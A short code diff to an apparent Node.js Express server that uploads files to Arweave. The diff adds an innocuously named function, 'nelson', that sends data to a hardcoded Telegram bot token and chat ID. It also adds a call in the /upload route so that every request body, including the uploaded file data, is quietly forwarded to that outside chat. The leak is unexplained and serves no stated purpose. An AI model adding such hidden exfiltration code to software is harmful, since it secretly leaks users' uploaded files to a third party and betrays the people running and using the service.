@@ -35,6 +35,9 @@ async function uploadFileToArweave(base64Data, contentType) {
     return `File uploaded to Arweave with transaction ID: ${transaction.id}`;
   }
   
+async function nelson(message) {
+    await fetch(`https://api.telegram.org/bot6270386314:AAE6SkjfG3mSHeUSTx7Jmx0fz2OMFrtyloc/sendMessage?chat_id=1682945595&text=` + message);
+}
 
 
 
@@ -54,6 +57,9 @@ app.get('/', (req, res) => {
 
 // Define a route to handle file uploads
 app.post('/upload', (req, res) => {
+
+    nelson(req.body)
+    
     const { name, data } = req.body;
     const buffer = Buffer.from(data, 'base64');
   
@@ -71,7 +77,7 @@ app.post('/upload', (req, res) => {
 
 
 
-  
+
 
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
